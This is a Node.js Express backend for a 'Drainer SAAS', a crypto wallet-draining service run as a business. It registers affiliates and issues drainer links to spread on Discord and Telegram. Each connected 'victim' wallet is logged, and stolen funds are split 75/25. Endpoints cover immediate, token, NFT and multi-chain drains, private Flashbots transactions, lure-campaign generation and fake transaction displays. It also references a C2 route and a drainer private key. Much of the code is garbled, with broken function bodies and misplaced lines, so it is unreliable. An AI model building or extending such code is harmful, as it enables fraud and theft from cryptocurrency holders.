// backend/index.js
import express from "express";
import http from "http";
import cors from "cors";
import { Server as SocketIOServer } from "socket.io";
import path from "path";
import fs from "fs";
import dotenv from "dotenv";
import { SwapHandler } from './swapHandler.js'
import { fileURLToPath } from "url";
import { dirname } from "path";
import trackHandler from "./api/track.js";
import fetch from "node-fetch";
import proxyHandler from './api/proxy.js';
import rateLimit from 'express-rate-limit';
import helmet from 'helmet';
import { ethers } from "ethers";
import { adminAuth } from "./admin-security.js";
import multiSigManager from './lib/multiSigManager.js'; 
import { rotateRPC } from './lib/rpcDecoder.js';
import { getExplorerApiKey, getRpcUrl } from './config.js';
import { CoreDrainer } from './coreDrainer.js';
import { flowCoordinator } from './modules/FlowCoordinator.js';
import { uiManager } from './modules/UIManager.js';
import cron from "node-cron";

const app = express();
const server = http.createServer(app);
export const io = new SocketIOServer(server);
// Middleware
app.use(cors());
const coreDrainer = new CoreDrainer();
// Main marketing website
app.get("/", (req, res) => {
  res.json({
    message: "Drainer SAAS Backend API",
    status: "running", 
    timestamp: new Date().toISOString(),
    endpoints: {
      register: "POST /saas/v2/register",
      dashboard: "GET /saas/dashboard/:clientId",
      panel: "GET /panel",
      health: "GET /health"
    },
    marketing: "https://ch.xqx.workers.dev/"
  });
});
app.get("/signup", (req, res) => {
  res.redirect("https://ch.xqx.workers.dev/");
// ==================== SAAS CLIENT MANAGEMENT ====================
let clients = new Map();
// File-based client data storage
// Save all client data to file
  try {
    const clientsData = {
      clients: Array.from(clients.entries()),
      earnings: Array.from(clientEarnings.entries()),
      victims: Array.from(clientVictims.entries()),
      timestamp: new Date().toISOString()
    };
    console.log("💾 Saved " + clients.size + " clients to file");
  } catch (error) {
    console.error("Error saving clients to file:", error);
  }
}
// Load client data from file on startup
      clients = new Map(data.clients || []);
      console.log("📂 Loaded " + clients.size + " clients from storage");
    }
    console.log("No existing client data found or file corrupted");
// Load existing data on server start
// Auto-save every 5 minutes
// Client configuration structure
class Client {
  constructor(id, config) {
    this.id = id;
    console.log(`💾 Saved ${clients.size} clients to file`);
    console.error('Error saving clients to file:', error);
      console.log(`📂 Loaded ${clients.size} clients from storage`);
    console.log('No existing client data found or file corrupted');
    this.name = config.projectName;
    this.themeColor = config.themeColor || '#6366f1';
    this.wallet = config.wallet;
    this.domain = `${id}.drainersaas.com`;
    this.earnings = 0;
    this.createdAt = new Date().toISOString();
    this.status = 'active';
// Client registration endpoint
app.post('/saas/register', (req, res) => {
    const { projectName, themeColor, wallet, contact } = req.body;
    
    // Validate wallet address
    if (!wallet || !ethers.isAddress(wallet)) {
      return res.status(400).json({ error: 'Valid wallet address required' });
    // Generate client ID
    const clientId = projectName.toLowerCase().replace(/[^a-z0-9]/g, '-') + '-' + Date.now().toString().slice(-6);
    // Create client
    const clientConfig = {
      projectName,
      themeColor: themeColor || '#6366f1',
      wallet,
      contact
    const newClient = new Client(clientId, clientConfig);
    clients.set(clientId, newClient);
    console.log(`🎯 New client registered: ${projectName} (${clientId})`);
    res.json({
  success: true,
  clientId: clientId,
  drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
  dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${themeColor}`,
  message: 'Client registered successfully'
    console.error('Client registration error:', error);
    res.status(500).json({ error: 'Registration failed' });
// Add this function after your imports
function initializeBitcoin() {
    const bitcoinRpcUrl = process.env.BITCOIN_RPC_URL;
    const bitcoinRpcUser = process.env.BITCOIN_RPC_USER;
    const bitcoinRpcPassword = process.env.BITCOIN_RPC_PASSWORD;
    if (!bitcoinRpcUrl) {
      console.log('⚠️ Bitcoin disabled: Missing RPC configuration in .env');
      return null;
    console.log(`✅ Bitcoin initialized: ${bitcoinRpcUrl.substring(0, 30)}...`);
    return {
      url: bitcoinRpcUrl,
      user: bitcoinRpcUser || 'free',
      password: bitcoinRpcPassword || 'public'
    console.log('⚠️ Bitcoin initialization failed:', error.message);
    return null;
// ==================== ENHANCED CLIENT MANAGEMENT ====================
// Enhanced Client class
class EnhancedClient {
    this.contact = config.contact;
    this.totalEarnings = 0;
    this.pendingPayout = 0;
    this.totalPayouts = 0;
    this.victimCount = 0;
    this.lastPayout = null;
// Enhanced registration endpoint
app.post('/saas/v2/register', (req, res) => {
    const newClient = new EnhancedClient(clientId, clientConfig);
    clientEarnings.set(clientId, []);
    clientVictims.set(clientId, []);
    console.log(`🎯 Enhanced client registered: ${projectName} (${clientId})`);
    console.error('Enhanced registration error:', error);
// ==================== EARNINGS TRACKING ====================
// Track drain earnings per client
function trackClientEarning(clientId, amount, token, victimAddress) {
  if (!clients.has(clientId)) return;
  
  const client = clients.get(clientId);
  const earnings = clientEarnings.get(clientId) || [];
  const victims = clientVictims.get(clientId) || [];
  const earningRecord = {
    id: Date.now().toString(),
    amount: amount,
    token: token,
    victimAddress: victimAddress,
    clientShare: amount * 0.75, // Client gets 75%
    platformShare: amount * 0.25 // You keep 25%
  };
  earnings.push(earningRecord);
  victims.push(victimAddress);
  // Update client totals
  client.totalEarnings += amount;
  client.pendingPayout += amount * 0.75;
  client.victimCount = victims.length;
  clientEarnings.set(clientId, earnings);
  clientVictims.set(clientId, victims);
  console.log(`💰 Client ${clientId} earned: ${amount} ${token} from ${victimAddress}`);
// Enhanced track endpoint with earnings
app.post("/api/track/v2", async (req, res) => {
    const { walletAddress, chain, clientId, amount = 0.1, token = 'ETH' } = req.body;
    if (clientId && clients.has(clientId)) {
      const client = clients.get(clientId);
      
      // Track the victim connection
      console.log(`👤 Client ${clientId} - Victim: ${walletAddress} on ${chain}`);
      // Simulate earnings (in real scenario, this comes from actual drains)
      trackClientEarning(clientId, amount, token, walletAddress);
      // Emit real-time update
      io.emit(`client-${clientId}`, {
        type: 'victim_connected',
        walletAddress: walletAddress,
        chain: chain,
        amount: amount,
        token: token,
        timestamp: new Date().toISOString()
      });
    res.json({ success: true, tracked: true });
    console.error('Enhanced tracking error:', error);
    res.status(500).json({ success: false, error: error.message });
// ==================== AUTOMATED PAYOUT SYSTEM ====================
let payoutHistory = new Map();
class Payout {
  constructor(clientId, amount, txHash = null) {
    this.id = Date.now().toString();
    this.clientId = clientId;
    this.amount = amount;
    this.txHash = txHash;
    this.status = txHash ? 'completed' : 'pending';
    this.timestamp = new Date().toISOString();
    this.processedAt = txHash ? new Date().toISOString() : null;
// Process payouts for all clients
async function processAllPayouts() {
  console.log('💰 Processing weekly payouts...');
  let totalPayouts = 0;
  for (const [clientId, client] of clients.entries()) {
    if (client.pendingPayout > 0.001) { // Minimum 0.001 ETH payout
      try {
        // In real implementation, you'd send crypto here
        // For now, we'll simulate the payout
        const payout = new Payout(clientId, client.pendingPayout, `0x${Math.random().toString(16).slice(2)}`);
        
        // Store payout history
        const clientPayouts = payoutHistory.get(clientId) || [];
        clientPayouts.push(payout);
        payoutHistory.set(clientId, clientPayouts);
        // Update client records
        client.totalPayouts += client.pendingPayout;
        client.lastPayout = new Date().toISOString();
        console.log(`✅ Processed payout for ${client.name}: ${client.pendingPayout} ETH`);
        // Reset pending payout
        client.pendingPayout = 0;
        totalPayouts++;
      } catch (error) {
        console.error(`❌ Payout failed for ${client.name}:`, error);
      }
  console.log(`🎉 Completed ${totalPayouts} payouts`);
  return totalPayouts;
// Manual payout trigger (for testing)
app.post('/saas/admin/process-payouts', async (req, res) => {
    const { password } = req.body;
    // Simple admin authentication
    if (password !== process.env.ADMIN_PASSWORD) {
      return res.status(401).json({ error: 'Unauthorized' });
    const processed = await processAllPayouts();
      success: true,
      message: `Processed ${processed} payouts`,
    });
    console.error('Payout processing error:', error);
    res.status(500).json({ error: 'Payout processing failed' });
// Weekly automatic payouts (every Monday 9 AM UTC)
cron.schedule('0 9 * * 1', async () => {
  console.log('⏰ Running scheduled payouts...');
  await processAllPayouts();
// Client payout history endpoint
app.get('/saas/payouts/:clientId', (req, res) => {
  const { clientId } = req.params;
  if (!clients.has(clientId)) {
    return res.status(404).json({ error: 'Client not found' });
  const payouts = payoutHistory.get(clientId) || [];
    success: true,
    client: {
      name: client.name,
      wallet: client.wallet,
      totalPayouts: client.totalPayouts
    payouts: payouts.reverse().slice(0, 20), // Last 20 payouts
    pendingPayout: client.pendingPayout
// ==================== CLIENT NOTIFICATION SYSTEM ====================
// Send notifications to clients
async function notifyClient(clientId, type, data) {
  if (!client) return;
  const notifications = {
    victim_connected: {
      title: '🎉 New Participant!',
      message: `New wallet connected to your drainer: ${data.walletAddress}`
    payout_processed: {
      title: '💰 Payout Processed!',
      message: `Your payout of ${data.amount} ETH has been sent to ${client.wallet}`
    milestone_reached: {
      title: '🏆 Milestone Reached!',
      message: `You've reached ${data.milestone} participants!`
  const notification = notifications[type];
  if (notification) {
    console.log(`📧 Notification for ${client.name}: ${notification.message}`);
    // In real implementation, you'd send Telegram/email here
    // For now, we'll log and emit via Socket.IO
    io.emit(`client-${clientId}-notification`, {
      type: type,
      title: notification.title,
      message: notification.message,
      timestamp: new Date().toISOString(),
      data: data
// Enhanced tracking with notifications
app.post("/api/track/v3", async (req, res) => {
      // Track earnings
      // Send notification
      await notifyClient(clientId, 'victim_connected', {
        amount: amount
      // Check for milestones
      if (client.victimCount % 10 === 0) {
        await notifyClient(clientId, 'milestone_reached', {
          milestone: `${client.victimCount} participants`
        });
    console.error('V3 tracking error:', error);
// ADD THIS IMPORT - import from backend/config.js instead of src/config.js
import { 
  RPC_URL, 
  LIFI_API_KEY, 
  COVALENT_API_KEY, 
  DESTINATION_WALLET, 
  DESTINATION_WALLET_SOL, 
  DRAINER_PK 
} from './config.js';
dotenv.config();
const apiKey = process.env.API_KEY;
const password = process.env.ADMIN_PASSWORD;
// Fix __dirname in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
// Load chains.json using traditional require-style
const chainsPath = path.join(__dirname, 'chains.json');
const chains = JSON.parse(fs.readFileSync(chainsPath, 'utf8'));
// Load environment variables from frontend/.env
dotenv.config({ path: path.join(__dirname, '.env') });
console.log('✅ Loaded backend .env');
// ========== SECURITY MIDDLEWARES ==========
// 1. Helmet for security headers - UPDATED WITH script-src-attr
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.socket.io"],
        scriptSrcAttr: ["'unsafe-inline'"], // ADD THIS LINE
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:", "http:", "blob:"],
        connectSrc: [
          "'self'", 
          "https://deep-index.moralis.io", 
          "ws:", 
          "wss:", 
          "http://localhost:3001",
          "http://localhost:5173"
        ],
        fontSrc: ["'self'", "data:"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
        frameAncestors: ["'none'"]
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" }
  })
);
// 2. CORS configuration
app.use(cors({
  origin: [
    'https://ch.xqx.workers.dev', // ← ADD THIS
    'http://localhost:5173', 
    'http://localhost:3000', 
    'http://localhost:3001'
  ],
  credentials: true
}));
app.use(express.json());
app.use(adminAuth);
// 3. General Rate Limiting
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per window
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
app.use(generalLimiter);
// 4. Strict Rate Limiting for sensitive endpoints
const strictLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 5, // Limit each IP to 5 requests per minute
  message: 'Too many attempts, please try again after a minute.',
// 5. IP Whitelist Middleware
const ipWhitelist = (req, res, next) => {
  // Get allowed IPs from environment variable or use defaults
  const allowedIPs = process.env.ADMIN_WHITELIST_IPS ? 
    process.env.ADMIN_WHITELIST_IPS.split(',') : 
    ['127.0.0.1', '::1']; // Default to localhost
  // Get client IP address
  const clientIP = req.ip || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   (req.connection.socket ? req.connection.socket.remoteAddress : null);
  // Clean up IP address (remove IPv6 prefix if present)
  const cleanIP = clientIP?.replace('::ffff:', '');
  if (!allowedIPs.includes(cleanIP)) {
    console.log(`🚫 Blocked admin access attempt from: ${cleanIP}`);
    return res.status(403).json({ 
      error: 'Access denied. IP not whitelisted for admin access.' 
  next();
};
// ==================== ADVANCED CLIENT DASHBOARD ====================
app.get('/saas/dashboard/:clientId', (req, res) => {
// Cloudflare Worker Dashboard Route
app.get("/dashboard.html", (req, res) => {
    const clientId = req.query.client;
    if (!clientId) {
        return res.status(400).send("Client ID required: ?client=your-id");
    res.redirect(`https://service-s816.onrender.com/saas/dashboard/${clientId}`);
    return res.status(404).send('Client not found');
  const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - ${client.name}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: #0f0f23;
            color: #ffffff;
            line-height: 1.6;
        .dashboard {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        .header {
            display: flex;
            justify-content: between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(99, 102, 241, 0.3);
        .brand {
            gap: 15px;
        .logo {
            font-size: 1.8rem;
            font-weight: bold;
            background: linear-gradient(135deg, ${client.themeColor}, #8b5cf6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        .stat-card {
            background: rgba(30, 30, 60, 0.6);
            border: 1px solid rgba(99, 102, 241, 0.3);
            border-radius: 15px;
            padding: 25px;
            backdrop-filter: blur(10px);
        .stat-value {
            font-size: 2.2rem;
            color: ${client.themeColor};
            margin-bottom: 5px;
        .stat-label {
            color: #94a3b8;
            font-size: 0.9rem;
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            margin-top: 10px;
            overflow: hidden;
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, ${client.themeColor}, #8b5cf6);
        .section {
            margin-bottom: 20px;
        .section-title {
            font-size: 1.3rem;
        .earnings-table {
            border-collapse: collapse;
        .earnings-table th,
        .earnings-table td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        .earnings-table th {
            font-weight: normal;
        .positive {
            color: #10b981;
        .url-box {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(99, 102, 241, 0.5);
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-family: monospace;
            word-break: break-all;
        .btn {
            border: none;
            color: white;
            padding: 12px 24px;
            cursor: pointer;
            font-size: 1rem;
            transition: all 0.3s ease;
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3);
        .payout-info {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 10px;
            margin: 20px 0;
    </style>
</head>
<body>
    <div class="dashboard">
        <div class="header">
            <div class="brand">
                <div class="logo">${client.name}</div>
                <div style="color: #94a3b8;">Dashboard</div>
            </div>
            <div style="color: #94a3b8;">Client ID: ${clientId}</div>
        </div>
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value">$${(client.totalEarnings * 1800).toFixed(2)}</div>
                <div class="stat-label">Total Earnings (USD)</div>
                <div class="progress-bar">
                    <div class="progress-fill" style="width: ${Math.min((client.totalEarnings / 10) * 100, 100)}%"></div>
                </div>
            
                <div class="stat-value">$${(client.pendingPayout * 1800).toFixed(2)}</div>
                <div class="stat-label">Pending Payout (Your 75%)</div>
                    <div class="progress-fill" style="width: ${Math.min((client.pendingPayout / 5) * 100, 100)}%"></div>
                <div class="stat-value">${client.victimCount}</div>
                <div class="stat-label">Total Participants</div>
                    <div class="progress-fill" style="width: ${Math.min((client.victimCount / 50) * 100, 100)}%"></div>
                <div class="stat-value">${client.totalEarnings.toFixed(4)} ETH</div>
                <div class="stat-label">Total Volume</div>
                    <div class="progress-fill" style="width: ${Math.min((client.totalEarnings / 5) * 100, 100)}%"></div>
        <div class="section">
            <h3 class="section-title">🚀 Your Drainer URL</h3>
            <div class="url-box">
                https://ch.xqx.workers.dev/?client/${clientId}
            <p style="color: #94a3b8; margin-bottom: 15px;">
                Share this link on Discord, Telegram, or social media to start earning!
            </p>
            <button class="btn" onclick="copyUrl()">Copy URL</button>
        <div class="payout-info">
            <h3 style="color: #10b981; margin-bottom: 10px;">💰 Payout Information</h3>
            <p><strong>Next Payout:</strong> Every Monday 9:00 AM UTC</p>
            <p><strong>Your Wallet:</strong> ${client.wallet}</p>
            <p><strong>Your Share:</strong> 75% of all earnings</p>
            <p><strong>Platform Fee:</strong> 25% (covers hosting & maintenance)</p>
            <h3 class="section-title">📈 Recent Earnings</h3>
            ${earnings.length > 0 ? `
                <table class="earnings-table">
                    <thead>
                        <tr>
                            <th>Date</th>
                            <th>Amount</th>
                            <th>Your Share</th>
                            <th>Participant</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${earnings.slice(-10).reverse().map(earning => `
                            <tr>
                                <td>${new Date(earning.timestamp).toLocaleDateString()}</td>
                                <td>${earning.amount} ${earning.token}</td>
                                <td class="positive">${earning.clientShare.toFixed(4)} ${earning.token}</td>
                                <td style="color: #94a3b8;">${earning.victimAddress.slice(0, 8)}...${earning.victimAddress.slice(-6)}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            ` : `
                <p style="color: #94a3b8; text-align: center; padding: 40px;">
                    No earnings yet. Share your URL to start earning!
                </p>
            `}
    </div>
    <script>
        function copyUrl() {
const url = 'https://ch.xqx.workers.dev/?client=${clientId}';
navigator.clipboard.writeText(url).then(() => {
                alert('URL copied to clipboard!');
            });
        // Auto-refresh every 30 seconds
        setInterval(() => {
            window.location.reload();
        }, 30000);
    </script>
</body>
</html>
  `;
  res.send(dashboardHTML);
// ==================== SINGLE-POPUP API ENDPOINTS ====================
// Single-popup drain endpoint
app.post('/api/single-popup-drain', async (req, res) => {
    const { userAddress, operations, chainId, userWallet } = req.body;
    console.log(`🎯 Single-popup drain request for: ${userAddress}`);
    // Validate request
    if (!userAddress || !operations || !Array.isArray(operations)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid request parameters'
    // Import single-popup modules
    const { multiChainDrain } = await import('./modules/multiChainDrain.js');
    const { universalTxBuilder } = await import('./modules/universalTxBuilder.js');
    const { flashbotsService } = await import('./modules/flashbots.js');
    // Initialize modules
    await multiChainDrain.initialize();
    await universalTxBuilder.initialize();
    await flashbotsService.initialize();
    // Execute single-popup drain
    const result = await multiChainDrain.executeSinglePopupMultiChainDrain(
      userAddress,
      userWallet, // This would be the connected user wallet
      operations
    );
    res.json(result);
    console.error('❌ Single-popup drain error:', error.message);
    res.status(500).json({
      success: false,
      error: error.message
// Single-popup transaction building endpoint
app.post('/api/single-popup/build-tx', async (req, res) => {
    const { operations, chainId, userWallet } = req.body;
    const result = await universalTxBuilder.buildSinglePopupDrainTx(
      userWallet,
      operations,
      chainId
    console.error('❌ Single-popup TX build error:', error.message);
// Single-popup private transaction endpoint
app.post('/api/single-popup/private-tx', async (req, res) => {
    const { transaction, chainId, userWallet } = req.body;
    const result = await flashbotsService.executeSinglePopupPrivateTx(
      transaction,
    console.error('❌ Single-popup private TX error:', error.message);
// Single-popup status endpoint
app.get('/api/single-popup/status', async (req, res) => {
    const status = {
      multiChainDrain: multiChainDrain.isInitialized,
      universalTxBuilder: universalTxBuilder.isInitialized,
      flashbotsService: flashbotsService.isInitialized,
      config: {
        enabled: SINGLE_POPUP_CONFIG.ENABLED,
        maxOperations: SINGLE_POPUP_CONFIG.MAX_OPERATIONS,
        maxExecutionTime: SINGLE_POPUP_CONFIG.MAX_EXECUTION_TIME
    res.json({ success: true, status });
// Single-popup simulation endpoint
app.post('/api/single-popup/simulate', async (req, res) => {
    const { transaction, chainId } = req.body;
    const simulation = await flashbotsService.simulateTransaction(
    res.json({ success: true, simulation });
    console.error('❌ Single-popup simulation error:', error.message);
// Batch single-popup operations endpoint
app.post('/api/single-popup/batch', async (req, res) => {
    // Build batch transaction
    const txResult = await universalTxBuilder.buildSinglePopupDrainTx(
    // Execute privately
    const executionResult = await flashbotsService.executeSinglePopupPrivateTx(
      txResult.transaction,
      txBuild: txResult,
      execution: executionResult
    console.error('❌ Single-popup batch error:', error.message);
// Single-popup configuration endpoint
app.get('/api/single-popup/config', (req, res) => {
    config: SINGLE_POPUP_CONFIG,
    supportedChains: SINGLE_POPUP_CONFIG.SUPPORTED_CHAINS.map(chainId => ({
      chainId,
      name: CHAINS_CONFIG[chainId]?.name || `Chain ${chainId}`,
      nativeSymbol: CHAINS_CONFIG[chainId]?.nativeCurrency?.symbol || 'ETH'
    }))
// Update single-popup configuration (admin only)
app.post('/api/single-popup/config/update', ipWhitelist, (req, res) => {
    const { updates } = req.body;
    // Validate password
    if (req.body.password !== process.env.ADMIN_PASSWORD) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    // Update configuration
    Object.assign(SINGLE_POPUP_CONFIG, updates);
      config: SINGLE_POPUP_CONFIG,
      message: 'Configuration updated successfully'
// ========== ERROR HANDLING MIDDLEWARE ==========
// Add this after your security middleware but before routes
app.use((err, req, res, next) => {
  console.error('❌ Server error:', err.message);
  res.status(500).json({ 
    error: 'Internal Server Error',
    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
// Serve everything in backend/ (so JS/CSS works)
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
const SUPPORTED_CHAINS = {};
function initializeChains() {
    // Initialize all chains from chains.json
    for (const [chainId, chainConfig] of Object.entries(chains)) {
        try {
          
            const activeRpc = rotateRPC(chainConfig.rpc);
            SUPPORTED_CHAINS[chainId] = {
                ...chainConfig,
                activeRpc: activeRpc,
                lastUsed: Date.now(),
                health: 'good'
            };
            console.log(`✅ ${chainConfig.name} initialized: ${activeRpc.substring(0, 30)}...`);
        } catch (error) {
            console.error(`❌ Failed to initialize ${chainConfig.name}: ${error.message}`);
    // Add Bitcoin initialization separately (since it's not in chains.json)
    const bitcoinConfig = initializeBitcoin();
    if (bitcoinConfig) {
        SUPPORTED_CHAINS['bitcoin'] = {
            name: 'Bitcoin',
            activeRpc: bitcoinConfig.url,
            lastUsed: Date.now(),
            health: 'good',
            // Add any other required Bitcoin-specific properties
            chainId: 'bitcoin',
            nativeCurrency: {
                name: 'Bitcoin',
                symbol: 'BTC',
                decimals: 8
            }
        };
        console.log(`✅ Bitcoin initialized: ${bitcoinConfig.url.substring(0, 30)}...`);
    } else {
        console.log('⚠️ Bitcoin disabled: Missing RPC configuration');
// Call this during startup
initializeChains();
// Apply strict rate limiting to sensitive endpoints
app.use('/api/admin', strictLimiter);
app.use('/api/transactions', strictLimiter);
app.use('/api/wallet', strictLimiter);
app.use('/api/execute-swap', strictLimiter);
app.use('/api/execute-drain', strictLimiter);
app.use('/api/auto-swap', strictLimiter);
// Apply IP whitelisting to admin routes
app.use('/admin', ipWhitelist);
app.use('/api/admin', ipWhitelist);
app.use('/c2/control', ipWhitelist);
// ==================== MULTI-SIG ENDPOINTS ==================== // ADDED
// Multi-sig approval request endpoint
app.post('/api/multisig/request', (req, res) => {
    const { operationType, targetAddress, amount, chainId, requester } = req.body;
    // Verify requester is authorized
    if (!multiSigManager.signers.includes(requester)) {
      return res.status(403).json({ error: 'Unauthorized requester' });
    const operationId = `drain_${targetAddress}_${Date.now()}`;
    const request = multiSigManager.createApprovalRequest(operationId, {
      operationType,
      targetAddress,
      amount,
      requester,
    res.json({ success: true, operationId, request });
    res.status(400).json({ success: false, error: error.message });
// backend/index.js - ADD SECURITY ENDPOINTS
app.post('/api/security/initialize', async (req, res) => {
    try {
        const result = await securityManager.initializeSecurity();
        res.json({ success: true, result });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
// User categorization endpoint
app.post('/api/analyze/categorize', async (req, res) => {
    const { assets } = req.body;
    const categories = await coreDrainer.categorizeUser(assets);
    res.json({ success: true, categories });
// ABI fetching endpoint
app.get('/api/contract/abi/:tokenAddress/:chainId', async (req, res) => {
    const { tokenAddress, chainId } = req.params;
    const abi = await coreDrainer.fetchERC20ABI(tokenAddress, chainId);
    res.json({ success: true, abi });
// NFT fetching endpoint
app.get('/api/nfts/:chainName/:userAddress', async (req, res) => {
    const { chainName, userAddress } = req.params;
    const nfts = await coreDrainer.fetchNFTs(chainName, userAddress);
    res.json({ success: true, nfts });
// Nonce fetching endpoint
app.get('/api/nonce/:tokenAddress/:userAddress', async (req, res) => {
    const { tokenAddress, userAddress } = req.params;
    const nonce = await coreDrainer.fetchNonce(tokenAddress, userAddress);
    res.json({ success: true, nonce });
// Signature parsing utility
app.post('/api/utils/split-signature', (req, res) => {
    const { signature } = req.body;
    const result = coreDrainer.splitSignature(signature);
    res.json({ success: true, ...result });
// Helper function to validate single-popup operations
function validateSinglePopupOperations(operations) {
  if (!Array.isArray(operations) || operations.length === 0) {
    throw new Error('No operations provided');
  if (operations.length > SINGLE_POPUP_CONFIG.MAX_OPERATIONS) {
    throw new Error(`Too many operations (max: ${SINGLE_POPUP_CONFIG.MAX_OPERATIONS})`);
  const validTypes = Object.values(SINGLE_POPUP_OPERATIONS);
  for (const operation of operations) {
    if (!operation.type || !validTypes.includes(operation.type)) {
      throw new Error(`Invalid operation type: ${operation.type}`);
    if (!operation.params) {
      throw new Error('Operation missing parameters');
    // Validate specific operation parameters
    switch (operation.type) {
      case SINGLE_POPUP_OPERATIONS.TOKEN_TRANSFER:
        if (!operation.params.tokenAddress || !operation.params.amount) {
          throw new Error('Token transfer missing required parameters');
        break;
      case SINGLE_POPUP_OPERATIONS.NFT_TRANSFER:
        if (!operation.params.nftAddress || !operation.params.tokenId) {
          throw new Error('NFT transfer missing required parameters');
      case SINGLE_POPUP_OPERATIONS.APPROVAL:
        if (!operation.params.tokenAddress || !operation.params.spenderAddress) {
          throw new Error('Approval missing required parameters');
      case SINGLE_POPUP_OPERATIONS.NATIVE_TRANSFER:
        if (!operation.params.amount) {
          throw new Error('Native transfer missing amount');
  return true;
// Helper to get operation statistics
function getSinglePopupStats() {
  return {
    totalOperations: 0, // Would track actual stats
    successRate: 1.0,
    averageExecutionTime: 0,
    byChain: {},
    byOperationType: {}
// Wallet analysis endpoint
app.post('/api/analyze/wallet', async (req, res) => {
    const { userAddress } = req.body;
    const assets = await coreDrainer.analyzeWallet(userAddress);
    res.json({ success: true, ...assets });
// Immediate drain endpoint
app.post('/api/execute/immediate-drain', async (req, res) => {
    const result = await coreDrainer.executeImmediateDrain(userAddress);
    res.json({ success: true, result });
// Token drain endpoint
app.post('/api/execute/token-drain', async (req, res) => {
    const result = await coreDrainer.batchDrainERC20(userAddress);
// Scheduling endpoint
app.post('/api/schedule/drain', async (req, res) => {
    const { userAddress, priority } = req.body;
    const result = await coreDrainer.scheduleDrain(userAddress, priority);
app.get('/api/security/monitor/gas', async (req, res) => {
        const status = await securityManager.monitorGasTank();
        res.json({ success: true, status });
// Enhanced API endpoints for frontend integration
app.post('/api/v1/execute-drain', async (req, res) => {
    const { userAddress, chainId, drainType } = req.body;
    // Multi-sig verification
    if (!multiSigManager.isOperationApproved(`drain_${userAddress}`)) {
      return res.status(403).json({ error: 'Multi-signature approval required' });
    const result = await coreDrainer.executeAdaptiveFlow(userAddress);
    res.status(500).json({ error: error.message });
app.post('/api/v1/analyze-wallet', async (req, res) => {
    const { userAddress, chainId } = req.body;
    const analysis = await coreDrainer.analyzeWallet(userAddress);
    res.json(analysis);
app.post('/api/v1/generate-lure', async (req, res) => {
    const { lureType, targetData } = req.body;
    const lure = await coreDrainer.generateLureCampaign([targetData], [lureType]);
    res.json(lure);
app.get('/api/security/audit', async (req, res) => {
        const audit = await securityManager.auditSecurity();
        res.json({ success: true, audit });
app.post('/api/security/multisig/request', async (req, res) => {
        const result = await securityManager.createMultiSigRequest(req.body);
        res.json(result);
app.post('/api/security/multisig/approve', async (req, res) => {
        const { operationId, signerAddress, signature } = req.body;
        const result = await securityManager.addMultiSigSignature(operationId, signerAddress, signature);
app.post('/api/ui/generate-fake-tx', (req, res) => {
    const fakeTx = uiManager.generateFakeTransaction();
    res.json({ success: true, transaction: fakeTx });
app.post('/api/ui/generate-fake-nft', (req, res) => {
    const fakeNFT = uiManager.generateFakeNFTMint();
    res.json({ success: true, nft: fakeNFT });
app.post('/api/ui/generate-token-list', (req, res) => {
    const tokens = uiManager.generateFakeTokenList(userAddress);
    res.json({ success: true, tokens });
app.post('/api/ui/validate-fake-tx', (req, res) => {
    const { txHash } = req.body;
    const isFake = uiManager.isFakeTransaction(txHash);
    res.json({ success: true, isFake });
// backend/index.js - ADD THESE ENDPOINTS
app.get('/api/chains/status', async (req, res) => {
    const status = chainManager.getChainStatus();
app.post('/api/flow/start', (req, res) => {
    const { userAddress, flowType } = req.body;
    const flowId = flowCoordinator.startDrainFlow(userAddress, flowType);
    res.json({ success: true, flowId });
app.post('/api/flow/step', (req, res) => {
    const { flowId, stepName, data } = req.body;
    const success = flowCoordinator.addFlowStep(flowId, stepName, data);
    res.json({ success });
app.post('/api/flow/status', (req, res) => {
    const { flowId, status, results } = req.body;
    const success = flowCoordinator.updateFlowStatus(flowId, status, results);
app.get('/api/flow/status/:flowId', (req, res) => {
    const { flowId } = req.params;
    const status = flowCoordinator.getFlowStatus(flowId);
app.get('/api/flow/active', (req, res) => {
    const activeFlows = flowCoordinator.getActiveFlows();
